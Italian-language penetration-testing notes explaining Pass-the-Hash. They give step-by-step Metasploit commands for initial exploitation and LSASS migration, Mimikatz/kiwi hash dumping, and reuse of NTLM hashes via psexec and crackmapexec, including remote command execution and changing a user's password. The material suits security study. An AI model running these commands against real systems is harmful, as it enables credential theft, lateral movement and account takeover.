# Pass-the-Hash Attacks

Il Pass-the-Hash (PtH) è una tecnica che consente di autenticarsi su un sistema remoto senza conoscere la password in chiaro, utilizzando direttamente l’hash NTLM dell’utente. È un metodo estremamente potente nel contesto del penetration testing perché **bypassa la necessità di conoscere la password vera e propria**, e permette comunque di accedere a servizi remoti che accettano l’autenticazione NTLM (come SMB o WinRM).

La capacità di catturare un hash NTLM è quindi fondamentale: esso rappresenta la “firma” digitale della password, e può essere utilizzato per ottenere l’accesso a risorse di rete, spostarsi lateralmente all'interno dell'infrastruttura e perfino compromettere interi domini Active Directory. A differenza delle password in chiaro, **gli hash NTLM spesso non vengono ruotati regolarmente** e, una volta ottenuti, **rimangono validi per lunghi periodi**, specialmente se associati ad account amministrativi.

## Sfruttamento con Metasploit

Un exploit utile per avviare un attacco iniziale è:

`use exploit/windows/http/badblue_passthru`

Dopo l’esecuzione e l’apertura di una sessione Meterpreter, si cerca il processo `lsass.exe` (Local Security Authority Subsystem Service), responsabile della gestione delle autenticazioni sul sistema. È proprio all'interno della memoria di questo processo che vengono archiviati gli hash NTLM e le credenziali in chiaro.

Puoi identificare il processo LSASS con:

`ps | grep lsass`

Una volta ottenuto il PID, si migra il payload di Meterpreter dentro LSASS:

`migrate <PID>`

Verifica che l’utente corrente abbia privilegi SYSTEM con:

`getuid`

Il risultato atteso dovrebbe essere:

`Server username: NT AUTHORITY\SYSTEM`

## Estrazione credenziali con Kiwi/Mimikatz

Carica il modulo `kiwi` nella sessione Meterpreter attiva (ora migrata in LSASS):

`load kiwi`

Il modulo `kiwi` integra tutte le funzionalità di **Mimikatz**, un tool potentissimo che consente di:

- Estrare credenziali in chiaro dalla memoria
- Dumpare hash NTLM e LM
- Fare attacchi pass-the-hash
- Interagire con i token di logon e impersonare utenti
- Rubare ticket Kerberos (Kerberoasting)

Per dumpare gli account locali dalla SAM (Security Account Manager):

`lsa_dump_sam`

La SAM è un database locale di Windows che contiene nomi utente, SID e hash delle password. Si trova nel filesystem in:

`C:\Windows\System32\config\SAM`

ed è accessibile **solo da un processo con privilegi SYSTEM o Kernel**.

Per ottenere direttamente LM e NTLM hash degli utenti locali:

`hashdump`

L’output ti mostra SID, LM Hash e NTLM Hash. L’hash NTLM è quello da usare per gli attacchi Pass-the-Hash. Si trova **prima del secondo “:”** e rappresenta l’identificativo univoco della password (in forma cifrata).

## Riutilizzo dell’hash – PsExec con Metasploit

Metti la sessione Meterpreter in background con `background` o `CTRL+Z`.

Poi usa:

`use exploit/windows/smb/psexec`

PsExec è un metodo legittimo utilizzato dagli amministratori Windows per eseguire programmi su macchine remote via SMB. Il modulo Metasploit ne replica il comportamento per ottenere una nuova shell con privilegi elevati.

Configura:

`set RHOST <IP_target>` <br>
`set SMBUser <utente_della_SAM>` <br>
`set SMBPass <password_in_chiaro>` # oppure l’hash NTLM <br>   
`set LPORT <porta_alternativa>` # diversa dalla sessione attuale <br>      
`set target Native\ upload` <br>

È importante usare una `LPORT` diversa da quella precedente per permettere a Metasploit di aprire una seconda sessione parallela.

Se stai usando l’hash NTLM, puoi specificarlo direttamente in `SMBPass`. L’intero hash può includere LM:NTLM, ma è sufficiente il solo hash NTLM.

## Alternativa con CrackMapExec

Un metodo più veloce e silenzioso è usare `crackmapexec`:

`crackmapexec smb <IP> -u <username> -p "<password>"` 

Oppure, se usi l’hash NTLM:

`crackmapexec smb <IP> -u <username> -H <NTLM_hash>`

Il comando tenterà l’autenticazione SMB. Se l’hash funziona, verrà mostrato l’indicatore:

`[Pwn3d!]`

Per eseguire comandi remoti (es. `whoami`, `ipconfig`, ecc.):

`crackmapexec smb <IP> -u <username> -H <hash> -x "whoami"`

Puoi anche cambiare la password di un utente con:

`crackmapexec smb <IP> -u <username> -H <hash> -x "net user <user> <newPassword>"`

Oppure ottenere la lista utenti della macchina:

`crackmapexec smb <IP> -u <username> -H <hash> -x "net user"`

Questi comandi ti consentono di ottenere pieno controllo operativo sul sistema target usando esclusivamente l’hash NTLM.
